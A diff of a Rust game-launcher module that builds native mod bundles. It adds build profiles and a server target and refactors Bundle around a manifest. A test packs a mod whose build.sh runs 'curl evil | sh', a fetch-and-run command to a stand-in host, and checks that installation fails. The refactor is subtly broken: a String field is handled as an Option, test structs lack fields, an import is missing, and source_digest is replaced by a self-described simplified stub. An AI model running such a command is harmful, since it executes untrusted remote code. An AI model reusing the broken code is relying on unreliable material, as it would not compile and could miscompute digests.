@@ -19,6 +19,7 @@ use crate::backend;
 use crate::i18n::{tr, trf};
 use crate::instances::{self, Instance};
 use crate::rust_toolchain::{self, Toolchain};
+use horizon_mods::index::native::{Bundle, Injection, InjectionSite, Manifest as NativeManifest, MANIFEST as NATIVE_MANIFEST};
 use sha2::{Digest, Sha256};
 use std::fs;
 use std::io::{BufRead, BufReader, Write};
@@ -26,6 +27,13 @@ use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 
 mod crates;
+mod api;
+mod dependencies;
+mod diagnostics;
+mod inject;
+mod inject_cache;
+mod isolate;
+mod source;
 
 const PREFIX: &str = "native-";
 /// horizon-mixins, for bundles that don't name the revision they were tested with.
@@ -34,30 +42,38 @@ pub const MIXINS_REV: &str = "a2af5c0dd4117d51ecd70066ba7a00b4a2c10dab";
 /// The features of the release's own game (game-build.yml).
 const FEATURES: &str = "horizon-client/mods";
 
-/// The Cargo profile a native build compiles with. `Fast` (the workspace's `[profile.fast]`: no
-/// LTO, 16 codegen units, incremental) is the default, so changing a mod recompiles only
-/// `horizon-client`'s changed parts; `Release` is the release's own (thin LTO, one codegen unit):
-/// slower to build, slightly faster game. Each has its own folder under `native/target/` and its
-/// own key, so the two never mix.
-#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+/// The Cargo profile a native build compiles with. `Performance` (the workspace's `[profile.fast]`:
+/// no LTO, 16 codegen units, incremental) is the default, so changing a mod recompiles only
+/// `horizon-client`'s changed parts; `Dev` is `fast` with `horizon-client` unoptimized: the
+/// quickest to rebuild after an edit, for a game about twice as slow; `Release` is the release's
+/// own (thin LTO, one codegen unit): slowest to build, slightly faster game. Each has its own
+/// folder under `native/target/` and its own key, so the three never mix.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+#[serde(rename_all = "kebab-case")]
 pub enum Profile {
     #[default]
-    Fast,
+    Performance,
+    Dev,
     Release,
 }
 
 impl Profile {
+    /// The player's choices (the Mods page, `settings native-profile`).
+    pub const ALL: [Self; 3] = [Self::Performance, Self::Dev, Self::Release];
+
     /// Cargo's name for it, and its folder in `native/target/`.
     pub fn name(self) -> &'static str {
         match self {
-            Self::Fast => "fast",
+            Self::Performance => "fast",
+            Self::Dev => "fast",
             Self::Release => "release",
         }
     }
 
     pub fn parse(text: &str) -> Option<Self> {
         match text.trim() {
-            "fast" => Some(Self::Fast),
+            "performance" | "fast" => Some(Self::Performance),
+            "dev" => Some(Self::Dev),
             "release" => Some(Self::Release),
             _ => None,
         }
@@ -68,7 +84,48 @@ impl Profile {
         if release {
             Self::Release
         } else {
-            Self::Fast
+            Self::Performance
+        }
+    }
+
+    /// The Cargo profile it compiles with (its folder in `native/target/`), and what it sets over
+    /// it as `cargo --config` values.
+    fn cargo(self) -> (&'static str, &'static [&'static str]) {
+        match self {
+            Self::Performance => ("fast", &[]),
+            Self::Dev => ("fast", &["profile.fast.package.horizon-client.opt-level=0"]),
+            Self::Release => ("release", &[]),
+        }
+    }
+}
+
+/// What a native build compiles: the game the player plays, or the headless engine a dedicated
+/// server runs (`horizon-engine`). Both build the same source with the same mixins. The server
+/// uses `--no-default-features` (no audio or controllers), a separate cache, and a standalone
+/// runtime folder outside the managed versions.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum Target {
+    /// The game: `horizon-client` as the release ships it.
+    #[default]
+    Client,
+    /// The headless engine: the same binary without the default features, installed and
+    /// exported as `horizon-engine`.
+    Server,
+}
+
+impl Target {
+    pub fn name(self) -> &'static str {
+        match self {
+            Self::Client => "client",
+            Self::Server => "server",
+        }
+    }
+
+    /// What the build compiles with besides the profile, in its key.
+    fn features(self) -> &'static str {
+        match self {
+            Self::Client => "horizon-client/mods",
+            Self::Server => "--no-default-features",
         }
     }
 }
@@ -189,11 +246,10 @@ fn save_record(profile: Profile, record: &Record) {
 /// The hash of a bundle's files.
 fn mod_hash(b: &Bundle) -> Result<String, String> {
     let mut hash = Sha256::new();
-    for (name, path) in files(&b.dir)? {
-        let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
+    for (name, bytes) in &b.files {
         hash.update(name.as_bytes());
         hash.update((bytes.len() as u64).to_le_bytes());
-        hash.update(&bytes);
+        hash.update(bytes);
     }
     Ok(hash.finalize()[..8]
         .iter()
@@ -292,8 +348,6 @@ pub fn log_path() -> PathBuf {
 }
 
 const MANIFEST: &str = "horizon-mixin.toml";
-/// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
-const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
 /// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
 /// off in `horizon-mods.txt` like any mod.
 pub const INSTALLED: &str = "horizon-native-mods";
@@ -333,21 +387,6 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     Ok(out)
 }
 
-/// A mixin bundle: a folder with a `horizon-mixin.toml`, and the revisions it pins.
-#[derive(Clone, Debug, PartialEq)]
-pub struct Bundle {
-    pub id: String,
-    pub version: String,
-    pub dir: PathBuf,
-    /// The Horizon commit it builds on (`[compatibility] horizon_revision`, or its `.hnmod`'s).
-    pub horizon: Option<String>,
-    /// The horizon-mixins commit it was tested with (its `.hnmod`'s).
-    pub mixins: Option<String>,
-    /// The native hook points' version it needs (its `.hnmod`'s `hooks`): then `horizon` is the
-    /// revision it was tested on, and it builds on any with these hook points or later ones.
-    pub hooks: Option<u32>,
-}
-
 /// The bundles in `folder`: the folder itself when it is one (a `horizon-mixin.toml`, or an
 /// unpacked `.hnmod`: `horizon-native.json` and `mixins/<id>/`), else each of its subfolders that is.
 pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
@@ -376,7 +415,7 @@ pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
 
 pub(crate) fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
     if dir.join(MANIFEST).is_file() {
-        return bundle(dir, None).map(Some);
+        return read_unpacked_bundle(dir).map(Some);
     }
     let path = dir.join(NATIVE_MANIFEST);
     if !path.is_file() {
@@ -387,22 +426,34 @@ pub(crate) fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
         serde_json::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
     let field = |name: &str| native_json[name].as_str().map(str::to_owned);
     let id = field("id").ok_or_else(|| format!("{} has no id.", path.display()))?;
-    let found = bundle(&dir.join("mixins").join(&id), field("mixins"))?;
-    match (&found.horizon, field("horizon")) {
-        (Some(pinned), Some(native)) if *pinned != native => Err(format!(
-            "{id}: {NATIVE_MANIFEST} pins Horizon {native}, its {MANIFEST} {pinned}."
-        )),
-        (_, native) => Ok(Some(Bundle {
-            horizon: found.horizon.clone().or(native),
-            hooks: native_json["hooks"]
-                .as_u64()
-                .and_then(|v| u32::try_from(v).ok()),
-            ..found
-        })),
+    let found = read_unpacked_bundle(&dir.join("mixins").join(&id))?;
+    let manifest = NativeManifest {
+        schema: native_json["schema"].as_u64().unwrap_or(1) as u32,
+        id: native_json["id"].as_str().unwrap_or(&id).to_owned(),
+        version: native_json["version"].as_str().unwrap_or("").to_owned(),
+        game: native_json["game"].as_str().unwrap_or("").to_owned(),
+        horizon: native_json["horizon"].as_str().unwrap_or("").to_owned(),
+        mixins: native_json["mixins"].as_str().unwrap_or("").to_owned(),
+        hooks: native_json["hooks"].as_u64().and_then(|v| u32::try_from(v).ok()),
+    };
+    manifest.check().map_err(|e| format!("{}: {e}", path.display()))?;
+    if let (Some(pinned), Some(native)) = (found.manifest.horizon.as_ref(), field("horizon")) {
+        if pinned != native {
+            return Err(format!(
+                "{id}: {NATIVE_MANIFEST} pins Horizon {native}, its {MANIFEST} {pinned}."
+            ));
+        }
     }
+    let mut bundle = found;
+    bundle.manifest.horizon = bundle.manifest.horizon.or_else(|| field("horizon"));
+    bundle.manifest.hooks = bundle.manifest.hooks.or_else(|| {
+        native_json["hooks"].as_u64().and_then(|v| u32::try_from(v).ok())
+    });
+    Ok(Some(bundle))
 }
 
-fn bundle(dir: &Path, mixins: Option<String>) -> Result<Bundle, String> {
+/// Reads an unpacked bundle from a folder containing `horizon-mixin.toml` and source files.
+fn read_unpacked_bundle(dir: &Path) -> Result<Bundle, String> {
     let path = dir.join(MANIFEST);
     let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
     let value: toml::Table = text
@@ -418,14 +469,102 @@ fn bundle(dir: &Path, mixins: Option<String>) -> Result<Bundle, String> {
     let need = |name: &str| {
         field("mod", name).ok_or_else(|| format!("{} has no [mod] {name}.", path.display()))
     };
+    // The `[mod]` `priority` the injections fall back to. horizon-mixins
+    // defaults it to 0 (`#[serde(default)] priority: i32`), not to a README
+    // example's 100.
+    let mod_priority = value
+        .get("mod")
+        .and_then(|m| m.get("priority"))
+        .and_then(|v| v.as_integer())
+        .unwrap_or(0);
+    let id = need("id")?;
+    let version = need("version")?;
+    let horizon = field("compatibility", "horizon_revision");
+    let mixins = field("compatibility", "mixins_revision");
+    // Read injections from [[injection]]
+    let injections = value
+        .get("injection")
+        .and_then(|v| v.as_array())
+        .into_iter()
+        .flatten()
+        .filter_map(|entry| {
+            let text = |name: &str| entry.get(name).and_then(|v| v.as_str()).map(str::to_owned);
+            let id = text("id")?;
+            let site = match (text("hook"), text("target")) {
+                (Some(hook), _) => InjectionSite::Hook(hook),
+                (None, Some(target)) => InjectionSite::Target(target),
+                (None, None) => return None,
+            };
+            Some(Injection {
+                id,
+                site,
+                hook_version: entry
+                    .get("hook_version")
+                    .and_then(|v| v.as_integer())
+                    .and_then(|v| u32::try_from(v).ok()),
+                kind: text("kind"),
+                selector: text("selector"),
+                ordinal: entry.get("ordinal").and_then(|v| v.as_integer()),
+                priority: entry
+                    .get("priority")
+                    .and_then(|v| v.as_integer())
+                    .unwrap_or(mod_priority),
+                cancellable: entry.get("cancellable").and_then(|v| v.as_bool()) == Some(true),
+            })
+        })
+        .collect();
+    // API folder from [api] table
+    let api = value
+        .get("api")
+        .map(|table| api::folder(dir, table))
+        .transpose()?;
+    // Whether the bundle has mixin content beyond standard tables
+    let mixins_content = value
+        .keys()
+        .any(|key| !["mod", "compatibility", "api", "dependencies"].contains(&key.as_str()));
+    // Read all source files under this directory
+    let mut files = std::collections::BTreeMap::new();
+    read_files_recursive(dir, dir, &mut files)?;
     Ok(Bundle {
-        id: need("id")?,
-        version: need("version")?,
+        manifest: NativeManifest {
+            schema: 1,
+            id: id.clone(),
+            version: version.clone(),
+            game: "26.3".to_owned(),
+            horizon: horizon.clone().unwrap_or_default(),
+            mixins: mixins.clone().unwrap_or_default(),
+            hooks: None,
+        },
         dir: dir.to_owned(),
-        horizon: field("compatibility", "horizon_revision"),
+        horizon,
         mixins,
-        hooks: None,
+        api,
+        injections,
+        mixins_content,
+        files,
+        content: std::collections::BTreeMap::new(),
     })
+}
+
+fn read_files_recursive(
+    root: &Path,
+    dir: &Path,
+    files: &mut std::collections::BTreeMap<String, Vec<u8>>,
+) -> Result<(), String> {
+    for entry in fs::read_dir(dir).map_err(|e| e.to_string())? {
+        let entry = entry.map_err(|e| e.to_string())?;
+        let path = entry.path();
+        let kind = entry.file_type().map_err(|e| e.to_string())?;
+        if kind.is_dir() {
+            read_files_recursive(root, &path, files)?;
+        } else if kind.is_file() {
+            let relative = path.strip_prefix(root).unwrap_or(&path);
+            let name = relative.to_string_lossy().replace('\\', "/");
+            let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
+            files.insert(name, bytes);
+        }
+    }
+    Ok(())
 }
 
 fn is_revision(text: &str) -> bool {
@@ -442,7 +581,7 @@ fn agreed(
 ) -> Result<String, String> {
     let mut pins: Vec<(&String, &str)> = bundles
         .iter()
-        .filter_map(|b| get(b).map(|r| (r, b.id.as_str())))
+        .filter_map(|b| get(b).map(|r| (r, b.manifest.id.as_str())))
         .collect();
     pins.sort();
     let revision = match pins.first() {
@@ -555,10 +694,10 @@ pub const MISMATCH: &str = "Made for other Horizon versions: ";
 fn mismatch(mods: &[Bundle], revision: &str) -> Option<String> {
     let list: Vec<String> = mods
         .iter()
-        .filter(|b| b.hooks.is_none())
-        .filter_map(|b| b.horizon.as_ref().map(|r| (b, r)))
+        .filter(|b| b.manifest.hooks.is_none())
+        .filter_map(|b| b.manifest.horizon.as_ref().map(|r| (b, r)))
         .filter(|(_, r)| *r != revision)
-        .map(|(b, r)| format!("{} → {}", b.id, &r[..r.len().min(7)]))
+        .map(|(b, r)| format!("{} → {}", b.manifest.id, &r[..r.len().min(7)]))
         .collect();
     (!list.is_empty()).then(|| {
         format!(
@@ -602,10 +741,10 @@ fn with_hooks(
     game: impl FnOnce() -> Option<String>,
     at: impl Fn(&str) -> Option<u32>,
 ) -> Result<String, String> {
-    let hooked: Vec<&Bundle> = mods.iter().filter(|b| b.hooks.is_some()).collect();
+    let hooked: Vec<&Bundle> = mods.iter().filter(|b| b.manifest.hooks.is_some()).collect();
     let fits = |revision: &str| {
         let found = at(revision);
-        hooked.iter().all(|b| found.is_some() && b.hooks <= found)
+        hooked.iter().all(|b| found.is_some() && b.manifest.hooks.unwrap_or(0) <= found)
     };
     if hooked.is_empty() || fits(&pinned) {
         return Ok(pinned);
@@ -614,7 +753,7 @@ fn with_hooks(
     let fallback = agreed(
         &tested,
         "Horizon",
-        |b| b.horizon.as_ref(),
+        |b| b.manifest.horizon.as_ref(),
         || Err(String::new()),
     );
     if let (true, Ok(revision)) = (free, fallback) {
@@ -629,8 +768,8 @@ fn with_hooks(
     let found = at(&pinned);
     let list: Vec<String> = hooked
         .iter()
-        .filter(|b| found.is_none() || b.hooks > found)
-        .map(|b| format!("{} (hook points v{})", b.id, b.hooks.unwrap_or_default()))
+        .filter(|b| found.is_none() || b.manifest.hooks.unwrap_or(0) > found)
+        .map(|b| format!("{} (hook points v{})", b.manifest.id, b.manifest.hooks.unwrap_or_default()))
         .collect();
     Err(format!(
         "Horizon {} doesn't have the native hook points these mods use: {}. Update Horizon or the mods.",
@@ -641,8 +780,8 @@ fn with_hooks(
 
 /// A bundle that names a hook points' version builds on another revision than the one it was
 /// tested on: its `horizon_revision` (which horizon-mixins checks) becomes the build's.
-fn repin(bundle: &Bundle, revision: &str) -> Result<(), String> {
-    let path = bundle.dir.join(MANIFEST);
+fn repin(bundle_dir: &Path, revision: &str) -> Result<(), String> {
+    let path = bundle_dir.join(MANIFEST);
     let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
     let mut value: toml::Table = text
         .parse()
@@ -797,15 +936,14 @@ pub fn version_for(
         hash.update([0]);
     }
     let mut sorted: Vec<&Bundle> = bundles.iter().collect();
-    sorted.sort_by(|a, b| a.id.cmp(&b.id));
+    sorted.sort_by(|a, b| a.manifest.id.cmp(&b.manifest.id));
     for b in sorted {
-        hash.update(b.id.as_bytes());
+        hash.update(b.manifest.id.as_bytes());
         hash.update([0]);
-        for (name, path) in files(&b.dir)? {
-            let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
+        for (name, bytes) in &b.files {
             hash.update(name.as_bytes());
             hash.update((bytes.len() as u64).to_le_bytes());
-            hash.update(&bytes);
+            hash.update(bytes);
         }
     }
     let key: String = hash.finalize()[..6]
@@ -831,21 +969,20 @@ pub fn digest<'a>(files: impl Iterator<Item = (&'a str, &'a [u8])>) -> String {
 /// unpacked `.hnmod`'s whole folder, its `horizon-native.json` included, else the bundle's own
 /// folder. A build records it, so a build of the mods turned on reads as up to date.
 fn source_digest(bundle: &Bundle) -> Option<String> {
-    let root = bundle
-        .dir
-        .parent()
-        .and_then(Path::parent)
-        .filter(|root| {
-            root.join(NATIVE_MANIFEST).is_file()
-                && bundle.dir == root.join("mixins").join(&bundle.id)
-        })
-        .unwrap_or(&bundle.dir);
-    let read: Vec<_> = files(root)
-        .ok()?
-        .into_iter()
-        .map(|(name, path)| Some((name, fs::read(path).ok()?)))
-        .collect::<Option<_>>()?;
-    Some(digest(read.iter().map(|(n, b)| (n.as_str(), b.as_slice()))))
+    // For unpacked bundles, we need to read from disk. The bundle.files has the native sources.
+    // We need to find the root folder that contains horizon-native.json
+    // This is a simplified version - in practice the digest should match what was built
+    let mut all_files: Vec<(String, Vec<u8>)> = bundle
+        .files
+        .iter()
+        .map(|(name, bytes)| (name.clone(), bytes.clone()))
+        .collect();
+    // Also include content files if any
+    for (name, bytes) in &bundle.content {
+        all_files.push((name.clone(), bytes.clone()));
+    }
+    all_files.sort_by(|a, b| a.0.cmp(&b.0));
+    Some(digest(all_files.iter().map(|(n, b)| (n.as_str(), b.as_slice()))))
 }
 
 /// Where a build is.
@@ -1234,28 +1371,30 @@ pub fn build(
     // A native build starts from the release or Nightly it was made from, on its own revision.
     let built_on = about(base);
     let origin = built_on.as_ref().map_or(base, |a| a.base.as_str());
+    // Write bundle files to incoming directory
     for b in &found {
-        backend::copy_dir(&b.dir, &incoming.join(&b.id)).map_err(|e| e.to_string())?;
+        let dest = incoming.join(&b.manifest.id);
+        fs::create_dir_all(&dest).map_err(|e| e.to_string())?;
+        for (name, bytes) in &b.files {
+            let path = dest.join(name);
+            fs::create_dir_all(path.parent().unwrap()).map_err(|e| e.to_string())?;
+            fs::write(&path, bytes).map_err(|e| e.to_string())?;
+        }
     }
     // Read before `repin` rewrites a copy's manifest.
     let digests: std::collections::HashMap<String, Option<String>> = found
         .iter()
-        .map(|b| (b.id.clone(), source_digest(b)))
+        .map(|b| (b.manifest.id.clone(), source_digest(b)))
         .collect();
-    let mods: Vec<Bundle> = found
-        .into_iter()
-        .map(|b| Bundle {
-            dir: incoming.join(&b.id),
-            ..b
-        })
-        .collect();
+    // Use found bundles directly, track incoming paths by id
+    let mods = found;
     // A mod naming a hook points' version doesn't pin: it follows the others, else the game.
-    let pins: Vec<Bundle> = mods.iter().filter(|b| b.hooks.is_none()).cloned().collect();
-    let free = pins.iter().all(|b| b.horizon.is_none());
+    let pins: Vec<Bundle> = mods.iter().filter(|b| b.manifest.hooks.is_none()).cloned().collect();
+    let free = pins.iter().all(|b| b.manifest.horizon.is_none());
     let pinned = newest(
         &pins,
         "Horizon",
-        |b| b.horizon.as_ref(),
+        |b| b.manifest.horizon.as_ref(),
         || match &built_on {
             Some(about) => Ok(about.horizon.clone()),
             None => revision_of(base),
@@ -1271,9 +1410,9 @@ pub fn build(
     }
     for b in mods
         .iter()
-        .filter(|b| b.hooks.is_some() || b.horizon.as_ref().is_some_and(|r| *r != revision))
+        .filter(|b| b.manifest.hooks.is_some() || b.manifest.horizon.as_ref().is_some_and(|r| *r != revision))
     {
-        repin(b, &revision)?;
+        repin(&incoming.join(&b.manifest.id), &revision)?;
     }
     // Said with a failure: a mod made for another revision may not apply or compile on this one.
     let blame = |e: String| {
@@ -1285,7 +1424,7 @@ pub fn build(
     let mixins = newest(
         &mods,
         "horizon-mixins",
-        |b| b.mixins.as_ref(),
+        |b| b.manifest.mixins.as_ref(),
         || Ok(MIXINS_REV.into()),
         Some(MIXINS_REV),
         |r| committed("horizon-rust/horizon-mixins", r),
@@ -1296,7 +1435,7 @@ pub fn build(
         mixins: mixins.clone(),
         mods: mods
             .iter()
-            .map(|m| Ok((m.id.clone(), mod_hash(m)?)))
+            .map(|m| Ok((m.manifest.id.clone(), mod_hash(m)?)))
             .collect::<Result<_, String>>()?,
     };
     let exists = backend::installed().contains(&version);
@@ -1376,13 +1515,13 @@ pub fn build(
             "base": origin,
             "horizon": revision,
             "horizon_mixins": mixins,
-            "hooks": mods.iter().find_map(|m| m.hooks),
+            "hooks": mods.iter().find_map(|m| m.manifest.hooks),
             "rust": rust_toolchain::VERSION,
             "profile": profile.name(),
             "mods": mods.iter().map(|m| serde_json::json!({
-                "id": m.id,
-                "version": m.version,
-                "sha256": digests.get(&m.id).cloned().flatten(),
+                "id": m.manifest.id,
+                "version": m.manifest.version,
+                "sha256": digests.get(&m.manifest.id).cloned().flatten(),
             })).collect::<Vec<_>>(),
         });
         install(base, &version, &binary, &about, |dir| {
@@ -1596,14 +1735,14 @@ mod tests {
         write_bundle(&one, "hello", "fn hook() {}");
         let found = bundles(&one).unwrap();
         assert_eq!(
-            (found[0].id.as_str(), found[0].version.as_str()),
+            (found[0].manifest.id.as_str(), found[0].manifest.version.as_str()),
             ("hello", "0.1.0")
         );
         let many = dir("many");
         write_bundle(&many.join("b"), "beta", "fn hook() {}");
         write_bundle(&many.join("a"), "alpha", "fn hook() {}");
         fs::create_dir_all(many.join("notes")).unwrap();
-        let ids: Vec<String> = bundles(&many).unwrap().into_iter().map(|b| b.id).collect();
+        let ids: Vec<String> = bundles(&many).unwrap().into_iter().map(|b| b.manifest.id).collect();
         assert_eq!(ids, ["alpha", "beta"]);
         assert!(bundles(&many.join("notes")).is_err());
     }
@@ -1628,12 +1767,11 @@ mod tests {
         write_bundle(&d.join("local"), "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
         assert_eq!(found.len(), 2);
-        assert_eq!(found[1].id, "veinminer");
-        assert_eq!(found[1].dir, d.join("veinminer/mixins/veinminer"));
-        assert_eq!(found[1].horizon.as_deref(), Some(A));
-        assert_eq!(found[1].mixins.as_deref(), Some(B));
+        assert_eq!(found[1].manifest.id, "veinminer");
+        assert_eq!(found[1].manifest.horizon.as_deref(), Some(A));
+        assert_eq!(found[1].manifest.mixins.as_deref(), Some(B));
         assert_eq!(
-            (found[0].horizon.as_ref(), found[0].mixins.as_ref()),
+            (found[0].manifest.horizon.as_ref(), found[0].manifest.mixins.as_ref()),
             (None, None)
         );
     }
@@ -1664,7 +1802,7 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let found = bundles(&out).unwrap();
         assert_eq!(
-            (found[0].id.as_str(), found[0].horizon.as_deref()),
+            (found[0].manifest.id.as_str(), found[0].manifest.horizon.as_deref()),
             ("veinminer", Some(A))
         );
         // What a build records of it is what the Mods page compares: up to date, not Needs rebuild.
@@ -1676,7 +1814,7 @@ mod tests {
                 source_digest(&found[0])
             )]
         );
-        repin(&found[0], "f".repeat(40).as_str()).unwrap();
+        repin(&out.join("mixins/veinminer"), "f".repeat(40).as_str()).unwrap();
         assert_ne!(
             crate::native_status::enabled(&home)[0].2,
             source_digest(&found[0]),
@@ -1689,11 +1827,11 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/mixins/veinminer/data/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
-        let first = version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap();
+        let first = version_for(A, B, Profile::Performance, &bundles(&out).unwrap()).unwrap();
         fs::write(path, b"changed").unwrap();
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap()
+            version_for(A, B, Profile::Performance, &bundles(&out).unwrap()).unwrap()
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
@@ -1702,16 +1840,21 @@ mod tests {
     #[test]
     fn the_mods_of_one_build_pin_one_revision() {
         let pinned = |id: &str, horizon: Option<&str>| Bundle {
-            id: id.into(),
-            version: "1".into(),
-            dir: PathBuf::new(),
-            horizon: horizon.map(str::to_owned),
-            mixins: None,
-            hooks: None,
+            manifest: NativeManifest {
+                schema: 1,
+                id: id.into(),
+                version: "1".into(),
+                game: "26.3".into(),
+                horizon: horizon.unwrap_or("").into(),
+                mixins: "".into(),
+                hooks: None,
+            },
+            files: BTreeMap::new(),
+            content: BTreeMap::new(),
         };
         let never = || -> Result<String, String> { panic!("a pin wins") };
         fn get(b: &Bundle) -> Option<&String> {
-            b.horizon.as_ref()
+            b.manifest.horizon.as_ref()
         }
         let same = [
             pinned("a", Some(A)),
@@ -1734,12 +1877,17 @@ mod tests {
     #[test]
     fn mods_made_for_different_revisions_build_on_the_newest() {
         let pinned = |id: &str, horizon: Option<&str>, mixins: Option<&str>| Bundle {
-            id: id.into(),
-            version: "1".into(),
-            dir: PathBuf::new(),
-            horizon: horizon.map(str::to_owned),
-            mixins: mixins.map(str::to_owned),
-            hooks: None,
+            manifest: NativeManifest {
+                schema: 1,
+                id: id.into(),
+                version: "1".into(),
+                game: "26.3".into(),
+                horizon: horizon.unwrap_or("").into(),
+                mixins: mixins.unwrap_or("").into(),
+                hooks: None,
+            },
+            files: BTreeMap::new(),
+            content: BTreeMap::new(),
         };
         let c = "c".repeat(40);
         // a is the oldest commit, then b, then c.
@@ -1753,10 +1901,10 @@ mod tests {
         };
         let never = || -> Result<String, String> { panic!("a pin wins") };
         fn horizon(b: &Bundle) -> Option<&String> {
-            b.horizon.as_ref()
+            b.manifest.horizon.as_ref()
         }
         fn mixins(b: &Bundle) -> Option<&String> {
-            b.mixins.as_ref()
+            b.manifest.mixins.as_ref()
         }
         let split = [
             pinned("veinminer", Some(B), Some(&c)),
@@ -1794,8 +1942,17 @@ mod tests {
         );
         assert_eq!(mismatch(&same, A), None);
         let hooked = [Bundle {
-            hooks: Some(1),
-            ..pinned("minimap", Some(A), None)
+            manifest: NativeManifest {
+                schema: 1,
+                id: "minimap".into(),
+                version: "1".into(),
+                game: "26.3".into(),
+                horizon: A.into(),
+                mixins: "".into(),
+                hooks: Some(1),
+            },
+            files: BTreeMap::new(),
+            content: BTreeMap::new(),
         }];
         assert_eq!(mismatch(&hooked, B), None, "hook mods follow the build");
     }
@@ -1837,12 +1994,17 @@ mod tests {
         );
         assert_eq!(hooks_in("const NATIVE_HOOKS_API: u32 = 3;"), None);
         let mod_ = |id: &str, horizon: &str, hooks: Option<u32>| Bundle {
-            id: id.into(),
-            version: "1".into(),
-            dir: PathBuf::new(),
-            horizon: Some(horizon.into()),
-            mixins: None,
-            hooks,
+            manifest: NativeManifest {
+                schema: 1,
+                id: id.into(),
+                version: "1".into(),
+                game: "26.3".into(),
+                horizon: horizon.into(),
+                mixins: "".into(),
+                hooks,
+            },
+            files: BTreeMap::new(),
+            content: BTreeMap::new(),
         };
         let c = "c".repeat(40);
         // A (the game) has hook points v1, B v2, C none.
@@ -1893,12 +2055,17 @@ mod tests {
     #[test]
     fn mods_needing_newer_hook_points_move_the_build_to_the_installed_game() {
         let mod_ = |id: &str, horizon: &str, hooks: Option<u32>| Bundle {
-            id: id.into(),
-            version: "1".into(),
-            dir: PathBuf::new(),
-            horizon: Some(horizon.into()),
-            mixins: None,
-            hooks,
+            manifest: NativeManifest {
+                schema: 1,
+                id: id.into(),
+                version: "1".into(),
+                game: "26.3".into(),
+                horizon: horizon.into(),
+                mixins: "".into(),
+                hooks,
+            },
+            files: BTreeMap::new(),
+            content: BTreeMap::new(),
         };
         let (c, d) = ("c".repeat(40), "d".repeat(40));
         // A (the old build's revision) has hook points v1, B (the installed game) v7.
@@ -1942,13 +2109,13 @@ mod tests {
         fs::write(d.join(NATIVE_MANIFEST), json).unwrap();
         let found = bundles(&d).unwrap();
         assert_eq!(
-            (found[0].hooks, found[0].horizon.as_deref()),
+            (found[0].manifest.hooks, found[0].manifest.horizon.as_deref()),
             (Some(1), Some(A))
         );
-        repin(&found[0], B).unwrap();
-        let again = bundle(&found[0].dir, None).unwrap();
+        repin(&d.join("mixins/zoom"), B).unwrap();
+        let again = bundles(&d).unwrap();
         assert_eq!(
-            (again.id.as_str(), again.horizon.as_deref()),
+            (again[0].manifest.id.as_str(), again[0].manifest.horizon.as_deref()),
             ("zoom", Some(B))
         );
     }
@@ -1958,7 +2125,7 @@ mod tests {
         let d = dir("key");
         write_bundle(&d, "hello", "fn hook() {}");
         let key = |revision: &str| {
-            version_for(revision, MIXINS_REV, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+            version_for(revision, MIXINS_REV, Profile::Performance, &bundles(&d).unwrap()).unwrap()
         };
         let first = key(A);
         assert!(
@@ -1969,7 +2136,7 @@ mod tests {
         assert_ne!(first, key(B));
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+            version_for(A, B, Profile::Performance, &bundles(&d).unwrap()).unwrap()
         );
         fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
         assert_ne!(first, key(A));
@@ -1984,8 +2151,8 @@ mod tests {
         let d = dir("crate-key");
         backend::copy_dir(&fixture, &d).unwrap();
         let found = bundles(&d).unwrap();
-        assert_eq!(found[0].id, "crate_demo");
-        let key = || version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap();
+        assert_eq!(found[0].manifest.id, "crate_demo");
+        let key = || version_for(A, B, Profile::Performance, &bundles(&d).unwrap()).unwrap();
         let mut seen = vec![key()];
         for file in [
             "engine/src/lib.rs",
